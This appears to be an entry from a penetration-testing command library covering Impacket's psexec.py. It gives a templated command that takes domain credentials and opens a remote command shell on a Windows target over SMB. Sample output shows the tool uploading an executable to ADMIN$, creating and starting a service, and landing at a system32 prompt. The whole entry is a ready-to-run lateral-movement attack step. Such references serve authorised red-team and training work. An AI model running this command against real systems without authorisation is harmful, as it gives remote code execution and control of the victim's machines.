---
id: 2151a2d8-f6b2-435f-9161-24aa956d54aa
name: psexec.py Connect and Spawn a Command Shell
type: command
executor: bash
data: psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
output: 'root@kali:~# psexec.py Bob:secretpass@10.10.10.10

  Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

  INFO:root:Trying protocol 445/SMB...

  INFO:impacket:Requesting shares on 10.10.10.10.....

  INFO:impacket:Found writable share ADMIN$

  INFO:impacket:Uploading file XdtdcRDj.exe

  INFO:impacket:Opening SVCManager on 10.10.10.10.....

  INFO:impacket:Creating service lTiZ on 10.10.10.10.....

  INFO:impacket:Starting service lTiZ.....

  [!] Press help for extra shell commands

  Microsoft Windows [Version 10.0.18362.295]

  (c) 2019 Microsoft Corporation. All rights reserved.

  C:\Windows\system32>'
created_at: '2019-10-01T17:58:48.946488+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# psexec.py Connect and Spawn a Command Shell

```bash
psexec.py $_DOMAIN/$_USERNAME:$_PASSWORD@$_TARGET_IP
```

## Expected Output

```
root@kali:~# psexec.py Bob:secretpass@10.10.10.10
Impacket v0.9.20-dev - Copyright 2019 SecureAuth Corporation

INFO:root:Trying protocol 445/SMB...

INFO:impacket:Requesting shares on 10.10.10.10.....
INFO:impacket:Found writable share ADMIN$
INFO:impacket:Uploading file XdtdcRDj.exe
INFO:impacket:Opening SVCManager on 10.10.10.10.....
INFO:impacket:Creating service lTiZ on 10.10.10.10.....
INFO:impacket:Starting service lTiZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.18362.295]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
